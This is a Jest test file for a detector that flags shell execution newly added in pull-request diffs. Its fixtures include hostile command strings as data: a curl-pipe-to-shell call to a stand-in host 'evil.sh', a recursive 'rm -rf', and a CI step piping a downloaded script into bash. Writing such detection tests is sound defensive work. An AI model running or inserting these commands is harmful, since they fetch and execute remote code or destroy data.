import { detectShellCommand } from "../../src/signals/shellCommand";
import { PullFile } from "../../src/types";

function file(filename: string, patch: string): PullFile {
  return { filename, status: "modified", additions: 1, deletions: 0, changes: 1, patch };
}

describe("detectShellCommand", () => {
  it("detects an added subprocess call", () => {
    const result = detectShellCommand([
      file(
        "scripts/run.py",
        "@@ -1,2 +1,3 @@\n import os\n+subprocess.run(['rm', '-rf', path])\n print('done')"
      ),
    ]);
    expect(result.detected).toBe(true);
  });

  it("detects os.system", () => {
    const result = detectShellCommand([
      file("scripts/run.py", "@@ -1,1 +1,2 @@\n+os.system('curl evil.sh | sh')"),
    ]);
    expect(result.detected).toBe(true);
  });

  it("detects child_process usage", () => {
    const result = detectShellCommand([
      file(
        "src/deploy.ts",
        "@@ -1,1 +1,2 @@\n+import { exec } from 'child_process';"
      ),
    ]);
    expect(result.detected).toBe(true);
  });

  it("detects a run: block added in a CI workflow file", () => {
    const result = detectShellCommand([
      file(
        ".github/workflows/deploy.yml",
        "@@ -1,2 +1,4 @@\n steps:\n+  - run: curl https://example.com/install.sh | bash"
      ),
    ]);
    expect(result.detected).toBe(true);
  });

  it("ignores run: blocks outside workflow files", () => {
    const result = detectShellCommand([
      file("docs/example.yml", "@@ -1,1 +1,2 @@\n+run: something"),
    ]);
    expect(result.detected).toBe(false);
  });

  it("ignores removed lines containing shell calls", () => {
    const result = detectShellCommand([
      file("scripts/run.py", "@@ -1,2 +1,1 @@\n-subprocess.run(['ls'])\n unrelated"),
    ]);
    expect(result.detected).toBe(false);
  });

  it("does not flag ordinary added code", () => {
    const result = detectShellCommand([
      file("src/utils.ts", "@@ -1,1 +1,2 @@\n+export const add = (a, b) => a + b;"),
    ]);
    expect(result.detected).toBe(false);
  });

  it("skips files without a patch (binary files)", () => {
    const result = detectShellCommand([
      { filename: "image.png", status: "added", additions: 0, deletions: 0, changes: 0 },
    ]);
    expect(result.detected).toBe(false);
  });
});
